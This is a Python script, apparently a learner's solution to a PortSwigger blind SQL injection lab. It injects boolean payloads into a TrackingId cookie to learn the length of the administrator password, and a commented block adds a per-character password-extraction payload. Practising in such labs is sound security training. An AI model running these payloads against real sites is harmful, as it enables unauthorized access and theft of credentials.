#!/usr/bin/env python3

import requests
import urllib3
from sys import argv
from urllib import parse

# diable disable_warnings if thir is proxy
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# change it manuale 
SiteCookies = {'TrackingId': 'XPjXEAnLufZXZ5sH' , 'session':'6DvUqMqwD2QyCrKq9HhvBHGtuqVdjYZ3'}

TargetUrl=argv[1]

# ================================= Functions ================================= #

# return list [ text of respone , status coe ]
# defualt value their is no cookies or proxies
def sendRequest(TargetUrl , proxies=None , cookies=None):
    try :
        result = requests.get(TargetUrl ,  cookies=cookies , proxies=proxies, verify=False )
        return [result.text,result.status_code]
    except:
        print("error")

# encode the payload [URL ENCODE]
def encodePayload(payload):
    return parse.quote(payload)


def binarySearch(array , num , low , high):
    
    BinarySearchPayload = " 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password){operator}{num})='a".format(operator="=")

    # Repeat until the pointers low and high meet each other
    while low <= high:

        mid = low + (high - low) // 2

        if array[mid] == num:
            return mid
        elif array[mid] < num:
            low = mid + 1
        else:
            high = mid - 1
    return -1



'''
Comments

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

' and SELECT IF(ASCII(SUBSTRING('SQL Tutorial', 1, 1))>100, "yes",  False) --
BinarySearchPayload = " 'AND ( SELECT 'a' FROM users WHERE username='administrator' IF(LENGTH(password))>{NUM}, "yes",  False) ) --"


LowPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a
HighPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a
EquelPyload = 'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={num})='a


crakPayload = 'AND (SELECT SUBSTRING(password,{num},1) FROM users WHERE username='administrator')='{letter}

def tryPayload(TargetUrl):
    while True:
        payload = input("Enter input: ")
        if payload == "stop":
            break
        else:
            TargetUrl = TargetUrl+payload
            statusCode = sendRequest(TargetUrl)
            print(statusCode[1])






'''

# ================================= Functions ================================= #


# ================================= Main ================================= #


if __name__ == '__main__':
    payload = "'AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{num})='a"
    for i in range(30):
        # Edit the value of the cookie to set the payload in it 
        SiteCookies["TrackingId"] = "XPjXEAnLufZXZ5sH" + encodePayload(payload.format(num=i))
        #print(SiteCookies["TrackingId"])
        
        # send the request with cookies after puting the dynamic payload 
        status = sendRequest(TargetUrl , cookies=SiteCookies , proxies=None)
        
        if status : 
            # print status code of the response
            print(status[1],end=" ")
            if "Welcome back!" in status[0]:
                print("Moer than: " , i) # This means the condition is True
            else:
                print("Done password Length is: " , i)
                break    
        else:
            print("error")
